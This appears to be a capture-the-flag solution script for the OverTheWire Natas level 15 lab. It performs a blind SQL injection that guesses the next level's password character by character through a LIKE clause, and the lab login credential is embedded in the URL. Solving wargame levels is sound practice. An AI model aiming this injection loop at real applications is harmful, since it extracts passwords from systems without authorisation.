import requests
import string

url = "http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org?debug=true"

user = 'natas16'
passwd = ""
passwd_len = 32
for i in range(len(passwd), passwd_len):
	for char in string.digits + string.ascii_letters:
		trying = f"{passwd}{char}"
		cmd = f"{user}\" and password LIKE \"{trying}%"
		r = requests.post(url, data={'username':cmd})

		splitted = r.text.split('Executing query: ')[1].split('<br>')
		query_executed = splitted[0]
		warning_or_error = splitted[1]

		print(f"SQL Query : {query_executed}")

		if "doesn't" not in warning_or_error:
			passwd += char
			print(f"Got char -- Curent pass : {passwd}")
			break

print(f"Natas16 password is {passwd}")
